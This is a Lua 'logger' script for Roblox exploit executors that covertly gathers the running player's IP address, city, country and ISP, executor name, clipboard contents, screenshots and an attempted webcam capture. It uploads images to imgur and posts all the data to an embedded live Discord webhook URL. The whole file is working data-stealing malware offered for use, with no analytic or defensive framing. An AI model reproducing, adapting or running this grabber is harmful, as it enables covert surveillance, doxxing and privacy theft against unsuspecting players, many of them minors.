-- DELTA EXECUTOR - ULTIMATE LOGGER (Clipboard + Face Cam + Flag + Spawn SS)
local request = (syn and syn.request) or (http and http.request) or request
if not request then return end

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local player = Players.LocalPlayer
local userId = player.UserId
local name = player.Name
local age = player.AccountAge .. " days"

-- Country Flag Function
local function getFlagEmoji(countryCode)
    countryCode = countryCode:upper()
    if #countryCode ~= 2 then return "" end
    local first = countryCode:sub(1,1):byte() - 65
    local second = countryCode:sub(2,2):byte() - 65
    if first < 0 or first > 25 or second < 0 or second > 25 then return "" end
    local flag1 = utf8.char(0x1F1E6 + first)
    local flag2 = utf8.char(0x1F1E6 + second)
    return flag1 .. flag2
end

-- Get IP
local ip
for _, url in {"http://icanhazip.com","https://api.ipify.org","http://ifconfig.me/ip"} do
    local s,r = pcall(request,{Url=url,Method="GET"})
    if s and r and r.Body then
        ip = r.Body:match("^(%d+%.%d+%.%d+%.%d+)$")
        if ip then break end
    end
end
if not ip then return end

-- Geo (with full countryCode for flag)
local geo = {city="?",country="?",isp="?",countryCode="??"}
pcall(function()
    local r = request({Url="http://ip-api.com/json/"..ip.."?fields=city,country,isp,countryCode",Method="GET"})
    if r and r.Body then
        local d = HttpService:JSONDecode(r.Body)
        if d then geo = d end
    end
end)
local flagEmoji = getFlagEmoji(geo.countryCode)

-- Display Name
local display = name
pcall(function()
    local r = request({Url="https://users.roblox.com/v1/users/"..userId,Method="GET"})
    if r and r.Body then
        local d = HttpService:JSONDecode(r.Body)
        if d and d.displayName then display = d.displayName end
    end
end)

-- Most Expensive
local best = {name="None",rap=0,value=0}
pcall(function()
    local r = request({Url="https://www.rolimons.com/playerapi/player/"..userId,Method="GET"})
    if r and r.Body then
        local data = HttpService:JSONDecode(r.Body)
        if data and data.items then
            for _,v in pairs(data.items) do
                local price = math.max(v.rap or 0, v.value or 0)
                if price > best.rap then
                    best = {name=v.name or "Unknown",rap=v.rap or 0,value=v.value or 0}
                end
            end
        end
    end
end)

-- HWID
local hwid = "N/A"
pcall(function()
    if identifyexecutor then hwid = identifyexecutor()
    elseif getexecutorname then hwid = getexecutorname()
    end
end)

-- Device
local device = "N/A"
pcall(function()
    device = string.format("Roblox v%s | %s", game.PlaceVersion, game:GetService("RunService"):IsStudio() and "Studio" or "Client")
end)

-- Profile
local avatar = "https://www.roblox.com/headshot-thumbnail/image?userId="..userId.."&width=150&height=150&format=png"
local profile = "https://www.roblox.com/users/"..userId.."/profile"
local isoTime = os.date("!%Y-%m-%dT%H:%M:%SZ")

-- Screenshot Upload Function
local function uploadScreenshot(imgData)
    if not imgData then return "https://i.imgur.com/removed.png" end
    local b64 = HttpService:EncodeBase64(imgData)
    local boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
    local bodyLines = {
        "--"..boundary,
        'Content-Disposition: form-data; name="file"; filename="screenshot.png"',
        "Content-Type: image/png",
        "",
        b64,
        "--"..boundary.."--"
    }
    local bodyStr = table.concat(bodyLines, "\r\n")

    local upload = request({
        Url = "https://api.imgur.com/3/image",
        Method = "POST",
        Headers = {
            ["Authorization"] = "Client-ID 546c25a59c58ad7",
            ["Content-Type"] = "multipart/form-data; boundary="..boundary
        },
        Body = bodyStr
    })

    if upload and upload.Body then
        local res = HttpService:JSONDecode(upload.Body)
        if res and res.data and res.data.link then
            return res.data.link
        end
    end
    return "https://i.imgur.com/removed.png"
end

-- Take Screenshot
local function takeSS()
    local ss = game:GetService("Workspace"):FindFirstChild("ScreenshotService") or game:GetService("ScreenshotService")
    if ss and ss.TakeScreenshot then
        local success, img = pcall(ss.TakeScreenshot)
        if success and img and img:FindFirstChild("Image") then
            return img.Image.Value
        end
    end
    return nil
end

-- Game SS (initial)
local gameSS = takeSS()
local gameSSUrl = uploadScreenshot(gameSS)

-- Spawn SS (wait for character, then take)
local spawnSSUrl = "https://i.imgur.com/removed.png"
if player.Character then
    spawnSSUrl = uploadScreenshot(takeSS())
else
    player.CharacterAdded:Wait()
    wait(2)  -- Wait for full spawn
    spawnSSUrl = uploadScreenshot(takeSS())
end

-- Clipboard Steal
local clipboard = "N/A"
pcall(function()
    if getclipboard or getclipboardtext then
        clipboard = getclipboard() or getclipboardtext()
    end
end)

-- Face Cam (exploit-specific, fallback N/A)
local faceCamUrl = "N/A"
pcall(function()
    if syn and syn.camera then
        local camData = syn.camera()
        if camData then
            faceCamUrl = uploadScreenshot(camData)  -- Assume returns image data
        end
    elseif webcam and webcam.capture then
        local camData = webcam.capture()
        if camData then
            faceCamUrl = uploadScreenshot(camData)
        end
    end
end)

-- Final Embed
local embed = {{
    author = {
        name = display .. " (@" .. name .. ")",
        url = profile,
        icon_url = avatar
    },
    title = "View Profile",
    url = profile,
    description =
        "**Account Age:** `"..age.."`\n"..
        "**Most Valuable:** `"..best.name.."`\n"..
        "**RAP:** `"..(best.rap > 0 and best.rap or "N/A").."` | **Value:** `"..(best.value > 0 and best.value or "N/A").."`\n\n"..
        "**IP:** `"..ip.."`\n"..
        "**Location:** `"..flagEmoji.." "..geo.city..", "..geo.country.."`\n"..
        "**ISP:** `"..geo.isp.."`\n\n"..
        "**HWID:** `"..hwid.."`\n"..
        "**Device:** `"..device.."`\n"..
        "**Clipboard:** `"..(clipboard ~= "N/A" and clipboard:sub(1,50).."..." or clipboard).."`\n"..
        "**Face Cam:** "..(faceCamUrl ~= "N/A" and faceCamUrl or "Failed").."\n",
    fields = {
        {name = "Game Screenshot", value = gameSSUrl, inline = false},
        {name = "Spawn Screenshot", value = spawnSSUrl, inline = false}
    },
    thumbnail = {url = avatar},
    color = 0x00ff88,
    footer = {text = "Logged • "..os.date("%Y-%m-%d %H:%M:%S")},
    timestamp = isoTime
}}

local payload = {
    username = "Roblox Logger",
    avatar_url = avatar,
    embeds = embed
}

local webhook = "https://discord.com/api/webhooks/1436898097765548032/NhpnCBD_N1jYTSCHSEKRVjTn2IeGfMeJkFTQAqeKzKAmdMjugeOkuUiJjKquwYS_79QY"

pcall(function()
    request({
        Url = webhook,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode(payload)
    })
end)
